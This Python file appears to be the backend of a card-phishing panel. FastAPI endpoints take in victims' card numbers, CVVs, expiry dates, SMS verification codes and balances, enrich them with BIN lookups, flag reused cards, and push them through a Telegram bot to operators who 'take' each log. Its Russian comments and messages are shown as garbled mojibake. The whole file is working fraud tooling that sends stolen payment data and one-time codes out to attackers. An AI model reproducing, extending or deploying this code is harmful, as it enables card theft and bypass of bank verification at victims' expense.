from fastapi import FastAPI
from aiogram import Bot
import datetime
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from database.crud import get_log_by_session, create_or_update_log, find_card_duplicates
from api.handy_api import get_card_info, format_card_info
from bot.keyboards import get_take_log_keyboard, get_management_keyboard
import config

def register_endpoints(app: FastAPI, bot: Bot):
    
    @app.post("/notify")
    async def notify(data: dict):
        try:
            session_id = data["sessionId"]
            masked_pan = data["maskedPan"]
            booking_id = data.get("bookingId", session_id[:8].upper())
            client_id = data["clientId"]
            step = data.get("step", "full")
            
            # –°–æ–∑–¥–∞–µ–º/–æ–±–Ω–æ–≤–ª—è–µ–º –ª–æ–≥
            create_or_update_log(session_id, masked_pan, booking_id, client_id, step)
            
            if step == "card_number_only":
                bin_number = masked_pan[:6]
                card_info = await get_card_info(bin_number)
                card_info_text = format_card_info(card_info)
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üÜî #{booking_id} || #{client_id}\n"
                    f"üéØ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –∫–∞—Ä—Ç—É, –ø—Ä–∏–≥–æ—Ç–æ–≤–∏—Ç—å—Å—è!\n\n"
                )
                
                # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ –¥—É–±–ª–∏–∫–∞—Ç–µ –¥–ª—è card_number_only
                duplicates = find_card_duplicates(masked_pan)
                previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
                
                if previous_uses:
                    message_text += f"‚ö†Ô∏è <b>–≠—Ç–∞ –∫–∞—Ä—Ç–∞ —É–∂–µ –≤–≤–æ–¥–∏–ª–∞—Å—å —Ä–∞–Ω–µ–µ</b>\n\n"
                
                message_text += (
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n"
                    f"üîπ <code>{masked_pan}</code>\n"
                    f"üîπ <code>{card_with_spaces}</code>\n\n\n"
                    f"{card_info_text}\n\n"
                    f"‚è≥ –û–∂–∏–¥–∞–µ–º CVV –∏ expiry date..."
                )
                
                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML")
                
            else:
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
                duplicates = find_card_duplicates(masked_pan)
                previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
                
                message_text = (
                    f"üÜî #{booking_id} || #{client_id}\n"
                    f"üîî –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ–∂–∏–¥–∞–µ—Ç üîî\n\n"
                )
                
                # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ –¥—É–±–ª–∏–∫–∞—Ç–µ, –µ—Å–ª–∏ –∫–∞—Ä—Ç–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞—Å—å —Ä–∞–Ω–µ–µ
                if previous_uses:
                    message_text += f"‚ö†Ô∏è <b>–≠—Ç–∞ –∫–∞—Ä—Ç–∞ —É–∂–µ –≤–≤–æ–¥–∏–ª–∞—Å—å —Ä–∞–Ω–µ–µ</b>\n\n"
                
                message_text += (
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n\n"
                    f"üîπ <code>{masked_pan}</code>\n"
                    f"üîπ <code>{card_with_spaces}</code>\n\n"
                )
                
                await bot.send_message(
                    config.GROUP_ID, 
                    message_text, 
                    parse_mode="HTML", 
                    reply_markup=get_take_log_keyboard(session_id)
                )

            return {"status": "ok"}
        
        except Exception as e:
            print(f"Error in /notify: {e}")
            return {"status": "error", "message": str(e)}, 500

    @app.post("/balance-notify")
    async def balance_notify(data: dict):
        session_id = data["sessionId"]
        balance = data["balance"]

        log = get_log_by_session(session_id)
        if log:
            booking_id = log['booking_id']
            client_id = log['client_id']

            if log and log['taken_by']:
                await bot.send_message(
                    log['taken_by'],
                    f"#{booking_id} || #{client_id}\n\n"
                    f"‚úÖ –ë–∞–ª–∞–Ω—Å —é–∑–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω!\n\nüí∞ –°—É–º–º–∞: {balance} AED"
                )
        return {"status": "ok"}

    @app.post("/sms-notify")
    async def sms_notify(data: dict):
        session_id = data["sessionId"]
        sms = data["sms"]

        log = get_log_by_session(session_id)
        if log:
            booking_id = log['booking_id']
            client_id = log['client_id']

            if log and log['taken_by']:
                await bot.send_message(
                    log['taken_by'],
                    f"#{booking_id} || #{client_id}\n\n"
                    f"‚úÖ –ö–æ–¥ —Å–º—Å –ø–æ–ª—É—á–µ–Ω!\n\nüî¢ –ö–æ–¥: {sms}"
                )
        return {"status": "ok"}

    @app.post("/change-card-notify")
    async def change_card_notify(data: dict):
        try:
            session_id = data["sessionId"]
            changed_card = data["changed_card"].strip()
            changed_expire = data["changed_expire"]
            changed_cvv = data["changed_cvv"]
          
            # –û—á–∏—â–∞–µ–º –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –æ—Ç –ø—Ä–æ–±–µ–ª–æ–≤
            card_without_spaces = changed_card.replace(' ', '')

            log = get_log_by_session(session_id)
            if not log:
                return {"status": "error", "message": "Log not found"}
                
            booking_id = log['booking_id']
            client_id = log['client_id']

            if log and log['taken_by']:
                duplicates = find_card_duplicates(card_without_spaces)
                previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—É—é –∫–∞—Ä—Ç—É –≤ –∏—Å—Ç–æ—Ä–∏—é –ü–û–°–õ–ï –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥—É–±–ª–∏–∫–∞—Ç–æ–≤
                if card_without_spaces and len(card_without_spaces) >= 6:
                    create_or_update_log(session_id, card_without_spaces, booking_id, client_id, "changed_card")
                
                # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –Ω–æ–≤–æ–π –∫–∞—Ä—Ç–µ —á–µ—Ä–µ–∑ Handy API
                card_info_text = ""
                if card_without_spaces and len(card_without_spaces) >= 6:
                    bin_number = card_without_spaces[:6]
                    card_info = await get_card_info(bin_number)
                    card_info_text = format_card_info(card_info)
                else:
                    card_info_text = "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã"
               
                # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                message = f"#{booking_id} || #{client_id}\n\n"
                
                # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ –¥—É–±–ª–∏–∫–∞—Ç–µ, –µ—Å–ª–∏ –∫–∞—Ä—Ç–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞—Å—å —Ä–∞–Ω–µ–µ
                if previous_uses:
                    message += f"‚ö†Ô∏è <b>–≠—Ç–∞ –∫–∞—Ä—Ç–∞ —É–∂–µ –≤–≤–æ–¥–∏–ª–∞—Å—å —Ä–∞–Ω–µ–µ</b>\n\n"
                
                message += (
                    f"‚úÖ –Æ–∑–µ—Ä –∏–∑–º–µ–Ω–∏–ª –∫–∞—Ä—Ç—É\n\n"
                    f"üîÑüí≥ –ù–æ–≤–∞—è –∫–∞—Ä—Ç–∞: <code>{card_without_spaces}</code>\n"
                    f"üîÑüóìÔ∏è –ù–æ–≤—ã–π —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {changed_expire}\n"
                    f"üîÑüîí –ù–æ–≤—ã–π CVV: {changed_cvv}\n\n"
                    f"üìä <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ:</b>\n"
                    f"{card_info_text}"
                )

                await bot.send_message(
                    log['taken_by'],
                    message,
                    reply_markup=get_management_keyboard(session_id),
                    parse_mode="HTML"
                )

            return {"status": "ok"}
            
        except Exception as e:
            print(f"Error in /change-card-notify: {e}")
            import traceback
            traceback.print_exc()
            return {"status": "error", "message": str(e)}, 500